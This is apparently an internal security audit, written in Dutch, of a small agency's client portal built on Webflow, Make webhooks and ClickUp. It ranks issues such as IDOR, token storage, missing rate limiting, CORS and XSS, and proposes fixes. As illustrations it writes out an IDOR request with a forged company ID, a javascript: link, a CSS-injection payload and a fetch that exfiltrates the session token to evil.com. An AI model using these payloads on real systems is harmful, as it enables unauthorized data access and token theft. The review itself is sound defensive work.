# Security Review — Studio 27 Klantenportaal

**Reviewer:** Background security audit
**Datum:** 2026-05-28
**Scope:** `dashboard.js`, `dashboard.html`, `dashboard.css`, `loader.js` + Make-architectuur (LEARNINGS.md)
**Context:** MVP B2B portal voor ~50-100 klanten. Risico-profiel = laag-medium (projectstatussen, deliverable-links, contactgegevens — geen betalingen, geen PII van eindklanten van de klant).

---

## TL;DR — Top 3 acties deze week

1. **P0** — Backend MOET `session_token` valideren in elke Make-scenario tegen `bedrijf_id`. Nu trust de server volledig de client → klant A kan klant B's volledige dashboard ophalen door 1 nummer aan te passen in DevTools. Dit staat letterlijk in LEARNINGS.md punt 10: *"Geen security: session_token niet gevalideerd in Dashboard Feed"*.
2. **P1** — Voeg basis rate limiting (per IP, per token) toe op de login-webhook. Nu kan iemand de 28-char tokens brute-forcen zonder enige throttling.
3. **P1** — Zet `noindex, nofollow` op de `/klanten` Webflow-pagina + voeg robots.txt-disallow toe. Voorkomt dat het portaal in Google search results komt.

Alles daarna is P2/P3 hardening.

---

## P0 — KRITIEK (fix asap)

### P0-1: Geen server-side authorization check (IDOR)

**Waar:** Alle Make-scenarios die `bedrijf_id` accepteren (`dashboard`, `projectDetail`, `uploadProject`, `uploadAlg`, etc.)

**Probleem:**
De client stuurt zowel `bedrijf_id` als `session_token` in iedere POST. Als de Make-scenarios alleen `bedrijf_id` gebruiken om data op te halen zonder te valideren dat het token bij dat bedrijf hoort, kan elke ingelogde klant ALLE dashboards van ALLE klanten zien.

```javascript
// dashboard.js regel 264
const res = await api(ENDPOINTS.dashboard, {
  bedrijf_id: state.session.bedrijf_id,        // ← client-supplied
  session_token: state.session.session_token   // ← niet gevalideerd backend-side
});
```

Een aanvaller met een geldige login voor klant A doet simpelweg:
```javascript
fetch('https://hook.eu1.make.com/q1hklcvhum7m14ie57p6t6ci7l6un48e', {
  method:'POST', headers:{'Content-Type':'application/json'},
  body: JSON.stringify({ bedrijf_id:'<willekeurig_clickup_id>', session_token:'eigen_token' })
})
```
en haalt klant B's projecten op.

**Fix:**
In ELK Make-scenario voor login binnen handler:
1. Lookup `bedrijf_id` in Bedrijven-lijst via ClickUp API
2. Lees custom field `Klantportaal token` (id `4474d855-...`)
3. Vergelijk met meegestuurd `session_token`
4. Als mismatch → return HTTP 403 + `{"ok":false,"error":"unauthorized"}`

Pseudocode in Make scenario:
```
1. ClickUp: Get Task (id = {{1.bedrijf_id}}, list = 901520180288)
2. Router:
   2a. Filter: {{2.custom_fields[?id=='4474d855-...'].value}} == {{1.session_token}}
       → continue met data fetch
   2b. Else:
       → WebhookRespond 403 {"ok":false,"error":"unauthorized"}
```

Bonus: log iedere mismatch met IP + bedrijf_id + token → snelle detectie van scanning attempts.

---

### P0-2: Session token in localStorage — leeftijd 30 dagen, geen invalidation

**Waar:** `dashboard.js` regels 56-58, 171-192

**Probleem:**
- Token leeft permanent in `localStorage` zolang `remember` aangevinkt is (standaard checked).
- Geen server-side token rotation, geen revocation endpoint.
- Als een klant zijn laptop verliest of een collega kwaadwillend is, blijft de toegang oneindig geldig.
- Token wordt nooit gerefreshed.

```javascript
// dashboard.js regel 183-187
function saveSession(s, remember){
  state.session = s;
  if(remember) localStorage.setItem(SESSION_KEY, JSON.stringify(s));
  else sessionStorage.setItem(SESSION_KEY, JSON.stringify(s));
}
```

`expires_at` wordt wel gecheckt aan de client, maar:
1. Demo-mode sets `expires_at: null` → permanent geldig (dashboard.js:960)
2. Client kan `expires_at` simpelweg patchen in DevTools

**Fix (gefaseerd, MVP-pragmatisch):**

Korte termijn (deze week):
- Backend MOET `expires_at` opnieuw valideren bij iedere call (zie P0-1, samen oplossen).
- Standaard `remember=false` (uncheck de checkbox default in HTML regel 45).
- Verkort token-levensduur naar 7 dagen.

Middellange termijn:
- Voeg een "force-logout" knop toe in ClickUp Bedrijven-detail die `Klantportaal token` regenereert. Dan kan Ilke 1-click een token revoken bij personeelswissel klantzijde.
- Overweeg refresh-token pattern: korte access token (1h) + long refresh token in httpOnly cookie. Maar dit vereist Make → cookie support → niet triviaal.

**Pragmatisch advies voor B2B MVP:** Forget httpOnly cookies (Make webhooks support dat slecht). Wel: server-side validatie + revocation knop + 7d expiry = 80% van het risico weg.

---

## P1 — HOOG (fix dit kwartaal)

### P1-1: Geen rate limiting op login endpoint

**Waar:** `ENDPOINTS.login` (Make 5896031)

**Probleem:**
- Tokens hebben format `TST-DEMO-2026a1b2c3d4e5f6789012345678` → 28 hex chars na prefix = ~104 bit entropy = niet brute-forceable in praktijk. **MAAR:** je kent nu wel het patroon (`<PREFIX>-<YEAR><hex>`) wat de search space drukt.
- Belangrijker: een aanvaller kan met geldige bedrijfsnaam + verkeerd token de login-webhook hammeren → kost geld (Make operations) + spamt logs + kan eventueel DoS.
- Make heeft 10K ops/maand op pro plan. 100 req/sec gedurende 1 minuut = 6000 ops = ~60% van maandbudget weg.

**Fix opties:**

Optie A — Cloudflare voor Make-webhooks (gratis):
- Zet Cloudflare Worker als proxy voor de Make webhooks.
- Rate limit: 10 req/min per IP op login, 100 req/min op andere.
- 1 worker, 5 routes, ~30 min setup.

Optie B — Make.com native:
- Tools/HTTP module met "Sleep" + counter in Data Store. Counter = `IP:loginAttempts:<hour>`. Bij >10 → return 429.
- Iets meer werk in elk scenario maar geen externe afhankelijkheid.

Optie C (snelst, minst goed):
- Frontend: `localStorage.lastLoginAt` + force 5s delay. Beschermt alleen tegen leken — een aanvaller scriptt de fetch direct.

**Advies:** Optie A. Cloudflare Worker als gateway voor alle Make-endpoints = ook handig voor logging/observability later.

---

### P1-2: Webflow portal pagina publicly indexable

**Waar:** `https://www.studio27.be/klanten` (uit Webflow embed setup)

**Probleem:**
- Pagina is publiek = Google kan crawlen = klantnamen + login-formulier kan in search results komen.
- "Studio 27 klantenportaal" → SEO doelwit voor phishing-clones.
- Geen robots.txt-protectie zichtbaar.

**Fix:**
1. In Webflow page settings van `/klanten`:
   - SEO tab → "Exclude from sitemap" ✓
   - Custom code (head) → `<meta name="robots" content="noindex, nofollow, noarchive">`
2. `robots.txt` op studio27.be → voeg toe:
   ```
   User-agent: *
   Disallow: /klanten
   Disallow: /feedback
   ```
3. Overweeg: pagina naar obscuur path verplaatsen (`/p27` ofzo) en oude `/klanten` 301'en. Niet kritiek maar wel slimmer.

Note: dit blokkeert geen aanvaller die de URL kent — het voorkomt enkel dat Google de URL onbedoeld verspreidt.

---

### P1-3: CORS — webhooks accepteren alle origins

**Waar:** Make webhooks (geen CORS-config zichtbaar)

**Probleem:**
- Standaard Make webhooks accepteren requests van elke origin.
- Een kwaadaardige website kan met geldig gestolen token de webhooks aanroepen vanuit een klant's browser.
- Specifiek risico: phishing-site die de klant via XSS op een andere site (of social engineering) z'n token weer laat invoeren → site doet stilletjes upload naar `/uploadAlg` met malware.

**Fix in Make scenario:**
- Eerste module na webhook = Router met filter op `{{headers.origin}}` whitelist:
  - `https://studio27.be`, `https://www.studio27.be`, `http://localhost` (dev)
- Bij mismatch → WebhookRespond 403.

**Limit:** dit beschermt alleen tegen browser-based aanvallen (XHR/fetch). cURL/Node.js scripts negeren CORS. Dus dit is een aanvulling op P0-1 server-side authz, geen vervanging.

---

## P2 — MEDIUM (nice-to-have, geen MVP-blocker)

### P2-1: XSS — innerHTML met user-data — laag risico maar 1 lekje gevonden

**Waar:** `dashboard.js` regel 257 + algemene `esc()` patroon

**Goed nieuws:** De `esc()` functie (regel 121) is correct geïmplementeerd met escapes voor `& < > " '`. Bij snelle scan zie ik dat alle user/server data via `esc()` gaat in de render-functies.

**Twee aandachtspunten:**

1. **Link-attributes met `esc()`** — werkt voor de meeste gevallen, maar `javascript:` URLs worden niet geblokkeerd. Voorbeeld in regel 446:
   ```javascript
   ${m.link ? `<a href="${esc(m.link)}" target="_blank" rel="noopener">` : ''}
   ```
   Als een Make-scenario corrupt raakt en `m.link = "javascript:alert(document.cookie)"` returnt, dan rendert dit als klikbare JS-injectie. Onwaarschijnlijk (link komt uit ClickUp) maar bijna gratis te fixen.

   **Fix:** voeg URL-allowlist toe in `esc()` voor href:
   ```javascript
   function escUrl(u){
     if(!u) return '#';
     const s = String(u).trim();
     if(/^(https?:|mailto:|tel:)/i.test(s)) return esc(s);
     return '#';  // blocks javascript:, data:, vbscript:
   }
   ```
   Vervang `esc(m.link)` in href-contexten door `escUrl(m.link)`. Geldt voor regels: 446, 468, 489, 495, 496, 735, 797, 821.

2. **Background-image inline style met server data** — regels 637 en 733:
   ```javascript
   '<div class="s27-tile s27-tile-img" style="background-image:url(\'' + esc(item.url) + '\')" ...'
   ```
   `esc()` escapet `'` als `&#39;` wat OK is binnen HTML attribute, MAAR in een CSS-context binnen `style=""` is dit kwetsbaar voor CSS-injection als `item.url` bijv. `'); background-image:url(http://evil.com/track.png?steal=` bevat. De CSS parser ziet dan multipele declarations.

   **Fix:** valideer URL strict tegen scheme + drop alles met `(` `)` `;` `:`:
   ```javascript
   function safeBgUrl(u){
     if(!/^https?:\/\/[^'"()<>\s]+$/i.test(u||'')) return '';
     return u;
   }
   ```

   Risico-impact: laag (Make-scenario zou dit moeten injecteren = je hebt al breach). Maar 5 minuten fix.

---

### P2-2: File upload — MIME / extension validatie zwak

**Waar:** `dashboard.js` `handleFiles()` regel 840

**Probleem:**
- Frontend checkt `f.size > MAX_FILE_BYTES` (5 MB) ✓
- Geen MIME-validatie op type vs. claimed extension.
- Server-side (Make → ClickUp) is onbekend wat er gebeurt — als ClickUp het opslaat as-is dan kan klant een `.exe` uploaden als `.png`.
- Klant kan ook 25 MB+ uploaden door client-side limit te omzeilen (DevTools console).

**Realistisch risico:** laag. ClickUp serveert files met `Content-Disposition: attachment` standaard. Maar als andere klanten via dashboard de upload bekijken zou je in theorie een download-attack kunnen doen.

**Fix:**
1. Server-side (Make scenario `uploadAlg`):
   - Decode base64, check magic bytes (first 4-8 bytes) match claimed type.
   - Reject zip-bombs: check decompressed size voor zip-uploads.
   - Hard limit op `size > 5MB` server-side.
2. Frontend hardening (bestaande check is bypass-baar):
   ```javascript
   // Voeg toe naast .size check:
   const ALLOWED_MIME = ['image/png','image/jpeg','image/svg+xml','application/pdf', ...];
   if(!ALLOWED_MIME.includes(f.type)){
     addUploadRow(f.name, 'error', 'Bestandstype niet toegestaan', listId);
     continue;
   }
   ```
   (Maar frontend-check is alleen UX — backend moet dezelfde check doen.)

---

### P2-3: Base64 file upload via JSON payload — 25 MB JSON

**Waar:** `dashboard.js` regel 856-866

**Probleem:**
- Files worden base64-encoded in JSON body verzonden naar Make.
- 25 MB binary → ~34 MB base64 → JSON payload kan tegen Make.com webhook body-size limits aanlopen (5MB default per webhook).
- Als single file = 5MB → ~6.7MB base64. Boven limit van veel webhook configs.
- Geen client-side feedback dat upload zal mislukken — gebruiker ziet "Mislukt" zonder duidelijke reden.

**Fix:**
- Korte termijn: verlaag `MAX_FILE_BYTES` naar 3MB om base64 onder 4MB te houden.
- Lange termijn: pre-signed URL pattern — vraag Make om Drive upload URL, upload direct naar Google Drive vanuit browser. Veel sneller + geen limit.

**Niet kritiek voor security**, maar een tegenstander kan met grote payloads je Make ops budget opmaken (~P1-1 rate limiting lost dit ook deels op).

---

### P2-4: Session leak via XSS payload — localStorage > httpOnly

**Waar:** `localStorage.setItem(SESSION_KEY, JSON.stringify(s))` regel 185

**Probleem:**
- Token in localStorage = bereikbaar via JavaScript = elke XSS lekt het token.
- Als P2-1 of een toekomstige XSS-bug ontstaat, dan: `fetch('https://evil.com/?t='+localStorage.getItem('s27_session_v1'))` en het token is weg.

**Pragmatische beoordeling:** httpOnly cookies vereisen:
- Same-origin (Make.com hosting webhook, Webflow hosting frontend → cross-origin, cookies werken niet zonder CORS+credentials config)
- Of: portal op subdomain van studio27.be + Make achter Cloudflare Worker op studio27.be subdomain → custom cookie handling.

**Voor MVP:** localStorage is acceptabel ZOLANG:
- P2-1 XSS-vectors gefixt zijn (esc + escUrl + safeBgUrl)
- CSP header gezet wordt op `/klanten` om externe scripts te blokkeren
- Token expiry kort genoeg is (7d)

**Aanbeveling:** voeg minimaal een CSP toe via Webflow custom code:
```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self' https://cdn.jsdelivr.net https://cdn.prod.website-files.com https://hook.eu1.make.com https://fonts.googleapis.com https://fonts.gstatic.com;
               script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net;
               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
               img-src 'self' data: https://cdn.prod.website-files.com https://*.clickup.com https://*.googleusercontent.com;
               connect-src 'self' https://hook.eu1.make.com;">
```

Test dit GRONDIG in dev — CSP breekt vaak Webflow's eigen scripts. Mogelijk `'unsafe-inline'` voor scripts nodig houden initieel.

---

### P2-5: Hardcoded test client info in production code

**Waar:** `dashboard.js` regels 911-934 (getDemoData) + LEARNINGS.md regels 115-118

**Probleem:**
- Demo data bevat realistische klantnaam ("TEST CLIENT BV"), echte studio-adresregel, echte team-namen.
- LEARNINGS.md lekt het demo-token `TST-DEMO-2026a1b2c3d4e5f6789012345678` in plaintext.
- `?demo=1` activeert demo-mode zonder enige auth — iedereen kan demo data zien.

**Realistisch risico:** laag voor security, hoog voor *appearance*. Een prospect/concurrent ziet "TEST CLIENT BV" met 7 projecten en denkt: dit is echte klantdata. Of erger: ontdekt het demo-token in deze repo en gebruikt het om "echte" content te zien (er is geen → maar de illusie is er).

**Fix:**
- Verwijder LEARNINGS.md uit publieke jsDelivr-CDN als die actief gediend wordt. Check: `https://cdn.jsdelivr.net/gh/studio27marketing/klantenportaal@main/LEARNINGS.md` → als dit 200 returnt, verplaats LEARNINGS naar private repo of `/internal` met `.gitignore` op CDN-paths.
- Verifieer: `https://cdn.jsdelivr.net/gh/studio27marketing/klantenportaal@main/` directory listing of niet?
- Voor demo mode: laat staan voor eigen demos maar overweeg toggle via Vincent-only flag (bv. localStorage key) i.p.v. URL param.

---

### P2-6: Mixed sessionStorage / localStorage afhankelijk van checkbox

**Waar:** `dashboard.js` regels 183-187 + 964-966

**Klein logica-issue:**
```javascript
const sess = loadSession() || (function(){
  try { return JSON.parse(sessionStorage.getItem(SESSION_KEY)); } catch { return null; }
})();
```
`loadSession()` checkt alleen localStorage. Als gebruiker "remember" uitvinkt en even tab refresht, leest dit deze IIFE — goed. Maar als sessionStorage data corrupt is (geen `expires_at`), wordt het toch geladen.

**Fix:** maak `loadSession()` symmetrisch — check beide stores, valideer in beide gevallen `expires_at`:
```javascript
function loadSession(){
  for(const store of [localStorage, sessionStorage]){
    try {
      const raw = store.getItem(SESSION_KEY);
      if(!raw) continue;
      const s = JSON.parse(raw);
      if(s.expires_at && new Date(s.expires_at) < new Date()){
        store.removeItem(SESSION_KEY);
        continue;
      }
      if(!s.session_token || !s.bedrijf_id) continue;
      return s;
    } catch {}
  }
  return null;
}
```

---

## P3 — LAAG / nice-to-have

### P3-1: Login endpoint lekt usernames (timing-based enumeration)

Als de login-webhook andere response-tijd geeft voor "bedrijf bestaat niet" vs "bedrijf bestaat maar token fout", dan kan een aanvaller klantnamen enumereren. Test dit met een paar curl-calls; als delta >100ms → fix door random-sleep 200-500ms in beide paden.

### P3-2: Geen subresource integrity (SRI) op jsDelivr

```html
<script src="https://cdn.jsdelivr.net/gh/studio27marketing/klantenportaal@main/loader.js"></script>
```

Als jsDelivr ooit gecompromitteerd raakt (of je GitHub account), wordt malicious JS in elke klant z'n browser geserveerd. SRI hash + pinning op release-tag i.p.v. `@main` is veiliger.

**Trade-off:** SRI vereist hash regenereren bij elke update. Voor MVP `@main` is OK, maar overweeg bij productie-rijpheid:
```html
<script src="https://cdn.jsdelivr.net/gh/studio27marketing/klantenportaal@v1.2.0/loader.js"
        integrity="sha384-..."
        crossorigin="anonymous"></script>
```

### P3-3: Geen Content-Security-Policy headers

Zie P2-4. Niet kritiek zonder XSS, maar 1 regel die veel toekomstige risico's afdekt.

### P3-4: `confirm()` dialog voor logout omzeilbaar

```javascript
function handleLogout(){
  if(!confirm('...')) return;
  clearSession();
  ...
}
```
Niet security, alleen UX-quality.

### P3-5: ENDPOINTS hardcoded in client-source

Alle 6 Make webhook URLs staan in plain text in dashboard.js. Dit is geen secret (webhooks zijn public-by-design) maar het maakt enumeratie van je infrastructuur triviaal. Als één webhook ooit moet veranderen (compromised), moet je het in code wijzigen + cache invalideren.

**Mitigatie:** zet ENDPOINTS in een aparte `config.js` die je separately CDN'ed → eenvoudiger te rotate. Echt fix is per-klant tokens of mTLS, wat overkill is hier.

### P3-6: No CSRF protection on state-changing webhooks

`uploadAlg`, `uploadProject`, `bedrijfVoorkeuren` zijn state-changing. Zonder CSRF token kan elke andere site `fetch()` doen die je browser uitvoert met je opgeslagen credentials (= localStorage token, maar dat is ook in localStorage van die andere site → niet bereikbaar cross-origin sowieso).

**Realistisch:** localStorage is per-origin, dus CSRF is GEEN risico voor dit setup. Skip.

---

## Wat je NIET hoeft te fixen (en waarom)

1. **HTTPS-only fetch** — alle endpoints zijn al HTTPS. ✓
2. **noopener/noreferrer op externe links** — wordt al consistent toegepast. ✓
3. **esc() functie zelf** — implementatie correct, dekt 5 dangerous chars. ✓
4. **demoMode bypass** — geeft alleen toegang tot fake data, geen risico.
5. **alert/confirm** — UX, niet security.
6. **Markup escaping in tabs** — alle dynamic content gaat door esc(). ✓
7. **Drag-and-drop files** — DataTransfer veilig in moderne browsers.

---

## Concrete actielijst (in volgorde)

### Week 1
- [ ] **P0-1**: Backend session_token validatie in alle 6 Make scenarios — 2-3 uur werk per scenario.
- [ ] **P0-2 deel**: Zet `remember` checkbox default uncheck, verlaag expiry naar 7 dagen — 5 min.
- [ ] **P1-2**: noindex + robots.txt op /klanten — 10 min.

### Week 2-3
- [ ] **P1-1**: Cloudflare Worker rate limit OF Make-native counter — 2-4 uur.
- [ ] **P1-3**: Origin allowlist in Make scenarios — 30 min per scenario.
- [ ] **P2-1**: `escUrl()` + `safeBgUrl()` helpers + vervang alle href contexts — 1 uur.
- [ ] **P2-4**: CSP meta tag op /klanten + grondig testen — 2 uur.

### Toekomst
- [ ] **P0-2 vervolg**: Token revoke knop in ClickUp.
- [ ] **P2-2**: Server-side MIME validatie + magic byte check.
- [ ] **P2-3**: Pre-signed Drive upload URLs.
- [ ] **P3-2**: SRI + versie-pinning bij eerste echte productie-release.

---

## Bottom line voor een B2B MVP

**Echte zorg = 1 ding: P0-1 (server trust client).** Dat moet voor je live gaat met betalende klanten. Alle andere items zijn iteratie 2/3 hardening. Het portal is voor de rest pragmatisch gebouwd: `esc()` is consequent toegepast, geen ingewikkelde auth-flows die mis kunnen gaan, geen sensitive data zoals BTW-nummers of facturatie.

Voor 50-100 klanten met deze content = risico is "een concurrent zou onze projectplanning kunnen zien" niet "we verliezen credit cards". Een Cloudflare Worker als gateway lost P1-1 + P1-3 + observability in één klap op = beste ROI security investering.

Niet doen: full OAuth migratie, JWT met asymmetric signing, SOC2 audit. Wel doen: P0-1, P0-2, P1-2 deze week.
